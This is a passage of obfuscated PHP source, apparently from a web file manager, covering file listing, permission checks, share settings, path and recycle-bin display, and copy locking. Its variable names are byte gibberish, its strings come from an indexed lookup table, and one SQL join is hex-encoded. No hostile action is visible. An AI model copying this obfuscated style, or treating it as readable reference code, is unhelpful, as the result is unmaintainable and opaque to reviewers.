Ğ©§Î¯[$²„ùÂ‰¤[$ä«ÃÖÉ[550]]] = array(); } $ Ğ©§Î¯[$²„ùÂ‰¤[$ä«ÃÖÉ[550]]][$²„ùÂ‰¤[$ä«ÃÖÉ[97]]] = $²„ùÂ‰¤[$ä«ÃÖÉ[450]]; } foreach ($è·Ãµì as &$áÕÄ‘ñ¨) { $ÉÚà›ıß = $áÕÄ‘ñ¨[$ä«ÃÖÉ[550]]; if (!$ÉÚà›ıß || !is_array($ÚÆüûÆ–[$ÉÚà›ıß])) { continue; } $ŠüìËÜ® = $ÚÆüûÆ–[$ÉÚà›ıß]; $ŠüìËÜ®[$ä«ÃÖÉ[79]] = $áÕÄ‘ñ¨[$ä«ÃÖÉ[79]]; $ŠüìËÜ®[$ä«ÃÖÉ[32]] = $áÕÄ‘ñ¨[$ä«ÃÖÉ[32]]; if (!$ŠüìËÜ®[$ä«ÃÖÉ[556]]) { Model($ä«ÃÖÉ[553])->fileMd5Check($ŠüìËÜ®); } if (!isset(self::$cacheFileInfo[$ä«ÃÖÉ[557] . $ÉÚà›ıß])) { self::$cacheFileInfo[$ä«ÃÖÉ[557] . $ÉÚà›ıß] = array_merge(array(), $ŠüìËÜ®); } unset($ÚÆüûÆ–[$ÉÚà›ıß][$ä«ÃÖÉ[87]]); $¥¬ÑŞè = isset($ Ğ©§Î¯[$ÉÚà›ıß]) && is_array($ Ğ©§Î¯[$ÉÚà›ıß]) ? $ Ğ©§Î¯[$ÉÚà›ıß] : array(); $áÕÄ‘ñ¨[$ä«ÃÖÉ[170]] = array_merge($¥¬ÑŞè, $ÚÆüûÆ–[$ÉÚà›ıß]); if (isset($áÕÄ‘ñ¨[$ä«ÃÖÉ[170]][$ä«ÃÖÉ[184]])) { $áÕÄ‘ñ¨[$ä«ÃÖÉ[184]] = json_decode($áÕÄ‘ñ¨[$ä«ÃÖÉ[170]][$ä«ÃÖÉ[184]], !0); unset($áÕÄ‘ñ¨[$ä«ÃÖÉ[170]][$ä«ÃÖÉ[184]]); } } unset($áÕÄ‘ñ¨); } protected function _listAppendSourceInfo(&$’µÀÂäŞ, $ˆ™–ĞÇ) { $Ü²òÔÁ¢ =& $_SERVER[ç¦¬”œš]; $¤å¾ÎÒü = Model($Ü²òÔÁ¢[558])->listData(); $Şñ›²› = Model($Ü²òÔÁ¢[508])->listData(); $²”¯ş¨ = Model($Ü²òÔÁ¢[498])->listData(); $ŠÆİàÛñ = Model($Ü²òÔÁ¢[559])->listSimple(); $é‰õøïš = array_to_keyvalue($¤å¾ÎÒü, $Ü²òÔÁ¢[484]); $¦û ¦ßÉ = array_to_keyvalue_group($Şñ›²›, $Ü²òÔÁ¢[87], $Ü²òÔÁ¢[509]); $¿‚÷‡ = array_to_keyvalue($²”¯ş¨, $Ü²òÔÁ¢[87]); $º¾éÚÌ = array_to_keyvalue_group($ŠÆİàÛñ, $Ü²òÔÁ¢[193]); foreach ($’µÀÂäŞ as &$ÌÓ™Ç‡²) { $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]] = array($Ü²òÔÁ¢[560] => 0, $Ü²òÔÁ¢[561] => 0, $Ü²òÔÁ¢[562] => 0); if (isset($¿‚÷‡[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]])) { $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[563]] = 1; $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[564]] = $¿‚÷‡[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]][$Ü²òÔÁ¢[32]]; } if ($¦û ¦ßÉ && $é‰õøïš && isset($¦û ¦ßÉ[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]])) { $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[565]] = array(); foreach ($¦û ¦ßÉ[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]] as $Ö–®°Ëß) { $ëÇ¯ÖºÈ = $é‰õøïš[$Ö–®°Ëß]; $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[565]][] = array($Ü²òÔÁ¢[566] => $ëÇ¯ÖºÈ[$Ü²òÔÁ¢[484]], $Ü²òÔÁ¢[503] => $ëÇ¯ÖºÈ[$Ü²òÔÁ¢[32]], $Ü²òÔÁ¢[567] => $ëÇ¯ÖºÈ[$Ü²òÔÁ¢[568]]); } } if ($º¾éÚÌ && isset($º¾éÚÌ[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]])) { $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[569]] = array(); foreach ($º¾éÚÌ[$ÌÓ™Ç‡²[$Ü²òÔÁ¢[193]]] as $ÇÉØ¶™û) { $áÓ×‹›³ = $Ü²òÔÁ¢[570]; if ($ÇÉØ¶™û[$Ü²òÔÁ¢[571]] == $Ü²òÔÁ¢[91]) { $áÓ×‹›³ .= $Ü²òÔÁ¢[572]; } $ÌÓ™Ç‡²[$Ü²òÔÁ¢[90]][$Ü²òÔÁ¢[569]] = array_field_key($ÇÉØ¶™û, explode($Ü²òÔÁ¢[50], $áÓ×‹›³)); } } } unset($ÌÓ™Ç‡²); return $’µÀÂäŞ; } protected function _listAppendChildren(&$ï´Éà„Ø, $…°¤¶) { $ñ”½­† =& $_SERVER[ç¦¬”œš]; $×¶íº—² = array(); $å†°Áä = array($ñ”½­†[239] => 0, $ñ”½­†[240] => 0); foreach ($ï´Éà„Ø as &$²è†¸é¡) { if (!$²è†¸é¡[$ñ”½­†[494]]) { continue; } $×¶íº—²[] = $²è†¸é¡[$ñ”½­†[193]]; } unset($²è†¸é¡); if (!$×¶íº—²) { return; } $‹Í¨Ë™Ì = array($ñ”½­†[192] => array($ñ”½­†[7], $×¶íº—²), $ñ”½­†[514] => 0); $Ñ‰–‹¥ = array($ñ”½­†[192], $ñ”½­†[494], $ñ”½­†[573] => $ñ”½­†[574]); $òùœ©ŠŠ = $this->field($Ñ‰–‹¥)->where($‹Í¨Ë™Ì)->group($ñ”½­†[575])->select(); $§ÉÎ†¾¼ = array(); foreach ($òùœ©ŠŠ as $“„õó¯) { $ïøïé‡æ = $“„õó¯[$ñ”½­†[192]]; $Á’šš¾ = $“„õó¯[$ñ”½­†[494]] == $ñ”½­†[91] ? $ñ”½­†[240] : $ñ”½­†[239]; if (!isset($§ÉÎ†¾¼[$ïøïé‡æ])) { $§ÉÎ†¾¼[$ïøïé‡æ] = array($ñ”½­†[239] => 0, $ñ”½­†[240] => 0); } $§ÉÎ†¾¼[$ïøïé‡æ][$Á’šš¾] += $“„õó¯[$ñ”½­†[574]]; } foreach ($ï´Éà„Ø as &$²è†¸é¡) { if (!$²è†¸é¡[$ñ”½­†[494]]) { continue; } $ãØè¤¿² = is_array($§ÉÎ†¾¼[$²è†¸é¡[$ñ”½­†[193]]]) ? $§ÉÎ†¾¼[$²è†¸é¡[$ñ”½­†[193]]] : $å†°Áä; $²è†¸é¡[$ñ”½­†[240]] = $ãØè¤¿²[$ñ”½­†[240]]; $²è†¸é¡[$ñ”½­†[239]] = $ãØè¤¿²[$ñ”½­†[239]]; unset($²è†¸é¡[$ñ”½­†[495]]); } unset($²è†¸é¡); } protected function _listAppendAuth(&$šŠô¸ØÅ) { $ÂÚ­îÏ =& $_SERVER[ç¦¬”œš]; $éñ³ú‡ = array(); foreach ($šŠô¸ØÅ as $ÈÉ¤à¨†) { if ($ÈÉ¤à¨†[$ÂÚ­îÏ[190]] == self::TYPE_GROUP) { $éñ³ú‡[] = $ÈÉ¤à¨†[$ÂÚ­îÏ[193]]; } } if (!$éñ³ú‡) { return; } $ÖÄã¨¼û = array_to_keyvalue($šŠô¸ØÅ, $ÂÚ­îÏ[193]); $Í§¸Ç¯ = Model($ÂÚ­îÏ[576])->getSourceList($éñ³ú‡, $ÖÄã¨¼û); $Öª¶¡ã = KodUser::isRoot(); foreach ($šŠô¸ØÅ as $É ÑÅ„÷ => &$ÈÉ¤à¨†) { $ÈÉ¤à¨†[$ÂÚ­îÏ[496]] = $Í§¸Ç¯[$ÈÉ¤à¨†[$ÂÚ­îÏ[193]]]; if (!$ÈÉ¤à¨†[$ÂÚ­îÏ[496]] && $ÈÉ¤à¨†[$ÂÚ­îÏ[190]] == self::TYPE_GROUP) { $ÈÉ¤à¨†[$ÂÚ­îÏ[496]] = Action($ÂÚ­îÏ[577])->pathGroupAuthMake($ÈÉ¤à¨†[$ÂÚ­îÏ[578]]); if (!$ÈÉ¤à¨†[$ÂÚ­îÏ[496]] && !$Öª¶¡ã) { $ÈÉ¤à¨†[$ÂÚ­îÏ[233]] = !1; $ÈÉ¤à¨†[$ÂÚ­îÏ[232]] = !1; } } if ($ÈÉ¤à¨†[$ÂÚ­îÏ[496]]) { $ÈÉ¤à¨†[$ÂÚ­îÏ[233]] = AuthModel::authCheckEdit($ÈÉ¤à¨†[$ÂÚ­îÏ[496]][$ÂÚ­îÏ[497]]); $ÈÉ¤à¨†[$ÂÚ­îÏ[232]] = AuthModel::authCheckView($ÈÉ¤à¨†[$ÂÚ­îÏ[496]][$ÂÚ­îÏ[497]]); } $this->groupPathDisplay($ÈÉ¤à¨†); } unset($ÈÉ¤à¨†); } public function _listAppendAuthSecret(&$â‹È¯İ‡) { $…Åíœ¼È =& $_SERVER[ç¦¬”œš]; if (Model($…Åíœ¼È[517])->get($…Åíœ¼È[579]) != $…Åíœ¼È[91]) { return; } static $¨Ê‚¤ŞÛ = false; if (!$¨Ê‚¤ŞÛ) { $ÙÌİõ¡… = Model($…Åíœ¼È[580]); $Ñ™ˆ = Model($…Åíœ¼È[581]); $¨Ê‚¤ŞÛ = $Ñ™ˆ->listData(); $¨Ê‚¤ŞÛ = array_to_keyvalue($¨Ê‚¤ŞÛ, $…Åíœ¼È[193]); $ëÄÚŠ¼ = json_decode(Model($…Åíœ¼È[517])->get($…Åíœ¼È[582]), !0); $ëÄÚŠ¼ = array_to_keyvalue($ëÄÚŠ¼, $…Åíœ¼È[484]); foreach ($¨Ê‚¤ŞÛ as $”¿™¨˜­ => $”ÛÙ„—ª) { $™¬Ê°˜Ò = $ëÄÚŠ¼[$”ÛÙ„—ª[$…Åíœ¼È[583]]]; if (!$™¬Ê°˜Ò) { $Ñ™ˆ->remove($”ÛÙ„—ª[$…Åíœ¼È[484]]); unset($¨Ê‚¤ŞÛ[$”¿™¨˜­]); continue; } $á¹Èü¢ƒ = $ÙÌİõ¡…->listData($™¬Ê°˜Ò[$…Åíœ¼È[496]]); if (!$á¹Èü¢ƒ) { $Ñ™ˆ->remove($”ÛÙ„—ª[$…Åíœ¼È[484]]); unset($¨Ê‚¤ŞÛ[$”¿™¨˜­]); continue; } $”ÛÙ„—ª[$…Åíœ¼È[496]] = $á¹Èü¢ƒ; $”ÛÙ„—ª[$…Åíœ¼È[584]] = $™¬Ê°˜Ò; $”ÛÙ„—ª[$…Åíœ¼È[585]] = Model($…Åíœ¼È[586])->getInfoSimpleOuter($”ÛÙ„—ª[$…Åíœ¼È[536]]); $¨Ê‚¤ŞÛ[$”¿™¨˜­] = $”ÛÙ„—ª; } } $³æÙ¬â¼ = USER_ID; $Ä‹äÕ†¯ = array(); $…Şí¬²ò = $this->_listAppendPath($Ä‹äÕ†¯, !0); foreach ($â‹È¯İ‡ as $”¿™¨˜­ => &$”ÛÙ„—ª) { if (!is_array($”ÛÙ„—ª[$…Åíœ¼È[496]])) { continue; } if ($”ÛÙ„—ª[$…Åíœ¼È[190]] != $…Åíœ¼È[587]) { continue; } if (isset($¨Ê‚¤ŞÛ[$”ÛÙ„—ª[$…Åíœ¼È[193]]])) { $šìûûÒ = $¨Ê‚¤ŞÛ[$”ÛÙ„—ª[$…Åíœ¼È[193]]]; if (!is_array($”ÛÙ„—ª[$…Åíœ¼È[548]])) { $”ÛÙ„—ª[$…Åíœ¼È[548]] = array(); } $”ÛÙ„—ª[$…Åíœ¼È[548]][$…Åíœ¼È[588]] = $šìûûÒ[$…Åíœ¼È[583]]; $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[589]] = $šìûûÒ; $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[590]] = $”ÛÙ„—ª[$…Åíœ¼È[591]]; $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[592]] = $…Åíœ¼È[91]; if ($šìûûÒ[$…Åíœ¼È[536]] != $³æÙ¬â¼) { $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[497]] = $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[497]] & $šìûûÒ[$…Åíœ¼È[496]][$…Åíœ¼È[496]]; } continue; } $ò–¸û Ú = $this->parentLevelArray($”ÛÙ„—ª[$…Åíœ¼È[593]]); $éÃ‰‰ä´ = array_reverse($ò–¸û Ú); foreach ($éÃ‰‰ä´ as $÷ş˜°ÓÑ => $Í³İ–å) { if (!isset($¨Ê‚¤ŞÛ[$Í³İ–å])) { continue; } $šìûûÒ = $¨Ê‚¤ŞÛ[$Í³İ–å]; $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[589]] = $šìûûÒ; if ($šìûûÒ[$…Åíœ¼È[536]] != $³æÙ¬â¼) { $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[497]] = $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[497]] & $šìûûÒ[$…Åíœ¼È[496]][$…Åíœ¼È[496]]; } $ŸÍÈÙş° = $…Åíœ¼È[12]; $ŠÅÓéšŠ = count($ò–¸û Ú) - $÷ş˜°ÓÑ; for ($–í’–³Ï = 0; $–í’–³Ï < $ŠÅÓéšŠ; $–í’–³Ï++) { if (!isset($…Şí¬²ò[$ò–¸û Ú[$–í’–³Ï]])) { $ŸÍÈÙş° = $…Åíœ¼È[12]; break; } $ŸÍÈÙş° = $ŸÍÈÙş° . rtrim($…Şí¬²ò[$ò–¸û Ú[$–í’–³Ï]], $…Åíœ¼È[8]) . $…Åíœ¼È[8]; } $”ÛÙ„—ª[$…Åíœ¼È[496]][$…Åíœ¼È[590]] = rtrim($ŸÍÈÙş°, $…Åíœ¼È[8]) . $…Åíœ¼È[8]; break; } } unset($”ÛÙ„—ª); } public function groupPathDisplay(&$öËŠ˜¤Ú) { $œæ¹´ªš =& $_SERVER[ç¦¬”œš]; if ($öËŠ˜¤Ú[$œæ¹´ªš[190]] != self::TYPE_GROUP) { return; } $ëõ¦¹ıç = Model($œæ¹´ªš[594])->getInfo($öËŠ˜¤Ú[$œæ¹´ªš[578]]); $¸ö•ÊÙ© = $this->parentLevelArray($ëõ¦¹ıç[$œæ¹´ªš[593]]); $§Ñ·ºì€ = $œæ¹´ªš[12]; foreach ($¸ö•ÊÙ© as $¼†§“) { $„ïü¿ˆÛ = Model($œæ¹´ªš[594])->getInfo($¼†§“); $§Ñ·ºì€ .= $„ïü¿ˆÛ[$œæ¹´ªš[90]][$œæ¹´ªš[193]] . $œæ¹´ªš[50]; } $öËŠ˜¤Ú[$œæ¹´ªš[595]] = $ëõ¦¹ıç[$œæ¹´ªš[192]]; $öËŠ˜¤Ú[$œæ¹´ªš[596]] = $ëõ¦¹ıç[$œæ¹´ªš[593]]; $öËŠ˜¤Ú[$œæ¹´ªš[597]] = $ëõ¦¹ıç[$œæ¹´ªš[598]]; $öËŠ˜¤Ú[$œæ¹´ªš[599]] = $§Ñ·ºì€ . $ëõ¦¹ıç[$œæ¹´ªš[90]][$œæ¹´ªš[193]]; } protected function _listAppendPath(&$şšì„â , $ï”¹ÊÀÎ = false) { $•Í¢Ö¶¢ =& $_SERVER[ç¦¬”œš]; static $Ş Šµ® = array(); $Â˜‰—ƒ = array(); $Í÷’í¹Æ = array(); if ($ï”¹ÊÀÎ) { return $Ş Šµ®; } foreach ($şšì„â  as &$Ò±œ–ûŞ) { $ââÓ‹³ = $Ò±œ–ûŞ[$•Í¢Ö¶¢[193]]; if ($Ò±œ–ûŞ[$•Í¢Ö¶¢[494]] == $•Í¢Ö¶¢[91] && $Ò±œ–ûŞ[$•Í¢Ö¶¢[192]] != 0) { $Ş Šµ®[$ââÓ‹³] = $Ò±œ–ûŞ[$•Í¢Ö¶¢[32]]; } if ($Ò±œ–ûŞ[$•Í¢Ö¶¢[494]] == $•Í¢Ö¶¢[91] && $Ò±œ–ûŞ[$•Í¢Ö¶¢[192]] == 0) { $Ş Šµ®[$ââÓ‹³] = $this->_listAppendPathRoot($Ò±œ–ûŞ, array()); } if (isset($Í÷’í¹Æ[$Ò±œ–ûŞ[$•Í¢Ö¶¢[593]]])) { continue; } $Í÷’í¹Æ[$Ò±œ–ûŞ[$•Í¢Ö¶¢[593]]] = !0; $áİıéãú = $this->parentLevelArray($Ò±œ–ûŞ[$•Í¢Ö¶¢[593]]); foreach ($áİıéãú as $–ËÙ‡ù => $õ™À°°‰) { if (isset($Ş Šµ®[$õ™À°°‰])) { continue; } if ($–ËÙ‡ù == 0) { $Ş Šµ®[$õ™À°°‰] = $this->_listAppendPathRoot($Ò±œ–ûŞ, $áİıéãú); } if ($–ËÙ‡ù != 0) { $Â˜‰—ƒ[] = $õ™À°°‰; } } } unset($Ò±œ–ûŞ); $Â˜‰—ƒ = array_unique($Â˜‰—ƒ); if (count($Â˜‰—ƒ) > 0) { $½±§Ñ—Ù = array($•Í¢Ö¶¢[500] => array($•Í¢Ö¶¢[501], $Â˜‰—ƒ)); if (count($Â˜‰—ƒ) == 1) { $ı«üá¬® = $this->sourceInfo($Â˜‰—ƒ[0]); $æ‘üÖÍ = is_array($ı«üá¬®) ? array($ı«üá¬®) : !1; } else { $æ‘üÖÍ = $this->field($•Í¢Ö¶¢[600])->where($½±§Ñ—Ù)->select(); } if (!$æ‘üÖÍ) { $æ‘üÖÍ = array(); } foreach ($æ‘üÖÍ as $ø”Áäƒª) { $Ş Šµ®[$ø”Áäƒª[$•Í¢Ö¶¢[193]]] = $ø”Áäƒª[$•Í¢Ö¶¢[32]]; } } $ñ†•ñôÔ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ñ÷ßóÔ = array(); foreach ($şšì„â  as &$Ò±œ–ûŞ) { $´¬ÍÚ¥® = $Ò±œ–ûŞ[$•Í¢Ö¶¢[593]]; $Ûò˜¼ƒå = $•Í¢Ö¶¢[12]; if (isset($ñ÷ßóÔ[$´¬ÍÚ¥®])) { $Ûò˜¼ƒå = $ñ÷ßóÔ[$´¬ÍÚ¥®]; } else { $áİıéãú = $this->parentLevelArray($Ò±œ–ûŞ[$•Í¢Ö¶¢[593]]); foreach ($áİıéãú as $–ËÙ‡ù => $õ™À°°‰) { if (isset($Ş Šµ®[$õ™À°°‰])) { $Ûò˜¼ƒå .= $Ş Šµ®[$õ™À°°‰] . $•Í¢Ö¶¢[8]; } } $ñ÷ßóÔ[$´¬ÍÚ¥®] = $Ûò˜¼ƒå; } $Ûò˜¼ƒå .= $Ò±œ–ûŞ[$•Í¢Ö¶¢[32]]; if ($Ò±œ–ûŞ[$•Í¢Ö¶¢[494]] == $•Í¢Ö¶¢[91]) { $Ûò˜¼ƒå .= $•Í¢Ö¶¢[8]; } $Ò±œ–ûŞ[$•Í¢Ö¶¢[591]] = str_replace($•Í¢Ö¶¢[601], $•Í¢Ö¶¢[8], $Ûò˜¼ƒå); if ($Ò±œ–ûŞ[$•Í¢Ö¶¢[192]] == $•Í¢Ö¶¢[228]) { $Ò±œ–ûŞ[$•Í¢Ö¶¢[32]] = trim($Ş Šµ®[$Ò±œ–ûŞ[$•Í¢Ö¶¢[193]]], $•Í¢Ö¶¢[8]); $Ò±œ–ûŞ[$•Í¢Ö¶¢[591]] = $Ò±œ–ûŞ[$•Í¢Ö¶¢[32]] . $•Í¢Ö¶¢[8]; } if (intval($Ò±œ–ûŞ[$•Í¢Ö¶¢[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ò±œ–ûŞ, $áİıéãú, $ñ†•ñôÔ); } } unset($Ò±œ–ûŞ); return $şšì„â ; } private function _listAppendPathRecycle(&$©û·«ù, $óÆ–¬†®, $©éÀš·Ğ) { $¢É…–ö— =& $_SERVER[ç¦¬”œš]; if (!in_array($©éÀš·Ğ, $óÆ–¬†®) && $©û·«ù[$¢É…–ö—[193]] != $©éÀš·Ğ) { return; } $ÄÕ³…Óµ = explode($¢É…–ö—[8], trim($©û·«ù[$¢É…–ö—[591]], $¢É…–ö—[8])); $ä«»·àİ = implode($¢É…–ö—[8], array_slice($ÄÕ³…Óµ, 2)); $©û·«ù[$¢É…–ö—[591]] = $¢É…–ö—[8] . LNG($¢É…–ö—[602]) . $¢É…–ö—[8] . ltrim($ä«»·àİ, $¢É…–ö—[8]); $©û·«ù[$¢É…–ö—[593]] = $¢É…–ö—[603] . implode($¢É…–ö—[50], array_slice($óÆ–¬†®, 1)) . $¢É…–ö—[50]; if ($©û·«ù[$¢É…–ö—[193]] == $©éÀš·Ğ) { $©û·«ù[$¢É…–ö—[593]] = $¢É…–ö—[603]; $©û·«ù[$¢É…–ö—[192]] = $¢É…–ö—[228]; $©û·«ù[$¢É…–ö—[32]] = LNG($¢É…–ö—[602]); } $©û·«ù[$¢É…–ö—[604]] = $¢É…–ö—[605]; } protected function _listAppendPathRoot(&$…œ«Á¯, $Åúšòä´) { $øØÇèò =& $_SERVER[ç¦¬”œš]; static $ûšÁ„Ç¦ = false; $í®ÁŸÊó = $øØÇèò[12]; if ($…œ«Á¯[$øØÇèò[190]] == self::TYPE_USER) { if ($…œ«Á¯[$øØÇèò[578]] == USER_ID) { $í®ÁŸÊó = LNG($øØÇèò[606]); if ($ûšÁ„Ç¦ === !1) { $¶©Ñ£Ìá = Model($øØÇèò[607])->getInfoFull(USER_ID); $ûšÁ„Ç¦ = _get($¶©Ñ£Ìá, $øØÇèò[608], $øØÇèò[12]); } if ($Åúšòä´ && $Åúšòä´[0] == $ûšÁ„Ç¦ || !$Åúšòä´ && $…œ«Á¯[$øØÇèò[193]] == $ûšÁ„Ç¦) { $í®ÁŸÊó = LNG($øØÇèò[609]); $…œ«Á¯[$øØÇèò[610]] = $øØÇèò[611]; } if (!$Åúšòä´) { $…œ«Á¯[$øØÇèò[32]] = $í®ÁŸÊó; } } else { $…œ«Á¯[$øØÇèò[612]] = Model($øØÇèò[586])->getInfoSimpleOuter($…œ«Á¯[$øØÇèò[578]]); $í®ÁŸÊó = LNG($øØÇèò[613]) . $øØÇèò[176] . $…œ«Á¯[$øØÇèò[612]][$øØÇèò[32]] . $øØÇèò[178]; } } else { if ($…œ«Á¯[$øØÇèò[190]] == self::TYPE_GROUP) { $ËíŸøÏ = Model($øØÇèò[594])->getInfoSimple($…œ«Á¯[$øØÇèò[578]]); $í®ÁŸÊó = $ËíŸøÏ[$øØÇèò[32]]; } else { if ($…œ«Á¯[$øØÇèò[190]] == self::TYPE_SYSTEM) { $í®ÁŸÊó = $øØÇèò[614]; } } } $í®ÁŸÊó = $í®ÁŸÊó ? $øØÇèò[8] . $í®ÁŸÊó . $øØÇèò[8] : $øØÇèò[8]; return $í®ÁŸÊó; } protected function _listAppendUser(&$„¬×Ç—) { $àÙÜÏŠ  =& $_SERVER[ç¦¬”œš]; $ÏÂ–§ÆÕ = array_to_keyvalue($„¬×Ç—, $àÙÜÏŠ [12], $àÙÜÏŠ [536]); $ƒ²„Õ  = array_to_keyvalue($„¬×Ç—, $àÙÜÏŠ [12], $àÙÜÏŠ [538]); $è„¤ÙûÎ = array_merge($ÏÂ–§ÆÕ, $ƒ²„Õ ); $íõÇæŠé = Model($àÙÜÏŠ [607])->userListInfo($è„¤ÙûÎ); foreach ($„¬×Ç— as &$ÅÍğä) { $™ÚÊ¥¥¥ = $ÅÍğä[$àÙÜÏŠ [536]]; $ÅÍğä[$àÙÜÏŠ [536]] = $íõÇæŠé[$™ÚÊ¥¥¥] ? $íõÇæŠé[$™ÚÊ¥¥¥] : !1; $™ÚÊ¥¥¥ = $ÅÍğä[$àÙÜÏŠ [538]]; $ÅÍğä[$àÙÜÏŠ [538]] = $íõÇæŠé[$™ÚÊ¥¥¥] ? $íõÇæŠé[$™ÚÊ¥¥¥] : !1; if (_get($ÅÍğä, $àÙÜÏŠ [615], 0)) { $·´ìäıÀ = $GLOBALS[$àÙÜÏŠ [6]][$àÙÜÏŠ [92]][$àÙÜÏŠ [616]]; if ($ÅÍğä[$àÙÜÏŠ [548]][$àÙÜÏŠ [617]] <= time() - $·´ìäıÀ) { $this->metaSet($ÅÍğä[$àÙÜÏŠ [193]], $àÙÜÏŠ [618], null); $this->metaSet($ÅÍğä[$àÙÜÏŠ [193]], $àÙÜÏŠ [617], null); unset($ÅÍğä[$àÙÜÏŠ [548]][$àÙÜÏŠ [618]]); continue; } $É¾·†•÷ = $ÅÍğä[$àÙÜÏŠ [548]][$àÙÜÏŠ [618]]; $ÅÍğä[$àÙÜÏŠ [548]][$àÙÜÏŠ [619]] = Model($àÙÜÏŠ [607])->getInfoSimpleOuter($É¾·†•÷); } } unset($ÅÍğä); } public function parentLevelArray($øâ¡…) { $Òì×¥°ó =& $_SERVER[ç¦¬”œš]; $øâ¡… = explode($Òì×¥°ó[50], trim($øâ¡…, $Òì×¥°ó[50])); return array_remove_value($øâ¡…, $Òì×¥°ó[228]); } public function listAll($¤¸ùáñŠ) { $³§¢¾Ÿß =& $_SERVER[ç¦¬”œš]; $õŸ×ıœã = $this->sourceInfo($¤¸ùáñŠ); $ğ÷Ñ‡ß® = array($³§¢¾Ÿß[620] => array($³§¢¾Ÿß[621], $õŸ×ıœã[$³§¢¾Ÿß[593]] . $¤¸ùáñŠ . $³§¢¾Ÿß[622]), $³§¢¾Ÿß[623] => 0); $î³º„¸ë = $³§¢¾Ÿß[624]; $ÁÉ•â€œ = "\x4c\x45\x46\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\154\145\40\x66\151\154\145\x20\x6f\x6e\40\163\x6f\x75\x72\143\145\56\x66\151\154\145\111\104\40\75\x20\x66\x69\x6c\145\x2e\x66\x69\x6c\145\111\104"; $Ø¯Óª = $this->alias($³§¢¾Ÿß[528])->field($î³º„¸ë)->where($ğ÷Ñ‡ß®)->join($ÁÉ•â€œ)->select(); $this->_listAppendAuth($Ø¯Óª); $this->_listAppendUser($Ø¯Óª); $this->_listAppendPath($Ø¯Óª); $Ø¯Óª = array_to_keyvalue($Ø¯Óª, $³§¢¾Ÿß[193]); $é‚”ÉÙŸ = "\57{$õŸ×ıœã[$³§¢¾Ÿß[32]]}\x2f"; $é‚”ÉÙŸ = $é‚”ÉÙŸ == $³§¢¾Ÿß[601] ? $³§¢¾Ÿß[8] : $é‚”ÉÙŸ; $ÛĞ›áÒ = array(); foreach ($Ø¯Óª as $Á¨šâ° => $ø³óé³Ó) { $ç¼‹ïÉ£ = $this->parentLevelArray($ø³óé³Ó[$³§¢¾Ÿß[593]]); array_shift($ç¼‹ïÉ£); $õş‰Å = $é‚”ÉÙŸ; for ($Ã©Áã¸ = 0; $Ã©Áã¸ < count($ç¼‹ïÉ£); $Ã©Áã¸++) { $õş‰Å .= $Ø¯Óª[$ç¼‹ïÉ£[$Ã©Áã¸]][$³§¢¾Ÿß[32]] . $³§¢¾Ÿß[8]; } $õş‰Å .= $ø³óé³Ó[$³§¢¾Ÿß[32]]; if ($ø³óé³Ó[$³§¢¾Ÿß[494]]) { $õş‰Å .= $³§¢¾Ÿß[8]; } $ëéı·Æ = array($³§¢¾Ÿß[504] => str_replace($³§¢¾Ÿß[601], $³§¢¾Ÿß[8], str_replace($³§¢¾Ÿß[601], $³§¢¾Ÿß[8], str_replace($³§¢¾Ÿß[601], $³§¢¾Ÿß[8], $õş‰Å))), $³§¢¾Ÿß[625] => intval($ø³óé³Ó[$³§¢¾Ÿß[494]]), $³§¢¾Ÿß[626] => intval($ø³óé³Ó[$³§¢¾Ÿß[79]]), $³§¢¾Ÿß[88] => intval($ø³óé³Ó[$³§¢¾Ÿß[88]]), $³§¢¾Ÿß[90] => $this->pathInfoFilter($ø³óé³Ó)); if (!$ëéı·Æ[$³§¢¾Ÿß[494]]) { $ëéı·Æ[$³§¢¾Ÿß[550]] = $ø³óé³Ó[$³§¢¾Ÿß[550]]; } $ÛĞ›áÒ[] = $ëéı·Æ; } $ÛĞ›áÒ = array_sort_by($ÛĞ›áÒ, $³§¢¾Ÿß[87]); return $ÛĞ›áÒ; } } goto Cš±ƒ…Æ¿; Cš±ƒ…Æ¿: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ğû°‡Õ) { $œÇ¥èö =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $this->_lockCheck($œÇ¥èö[627], $ğû°‡Õ); $ˆòïõ… = 1; $this->_lockEvent($ğû°‡Õ, array($œÇ¥èö[628], $œÇ¥èö[629]), $ˆòïõ…); $this->_lockParent($ğû°‡Õ, array($œÇ¥èö[629]), $ˆòïõ…); $this->_lockEvent($ğû°‡Õ, array($œÇ¥èö[630], $œÇ¥èö[631]), $ˆòïõ…); $this->_lockCheckEnd($œÇ¥èö[627], $ğû°‡Õ); } public function lockCopyEnd($ÕÑØû÷£) { $èÛìì½· =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $Ï÷¹¤È = 0; $this->_lockEvent($ÕÑØû÷£, array($èÛìì½·[628], $èÛìì½·[629]), $Ï÷¹¤È); $this->_lockParent($ÕÑØû÷£, array($èÛìì½·[629]), $Ï÷¹¤È); $this->_lockEvent($ÕÑØû÷£, array($èÛìì½·[630], 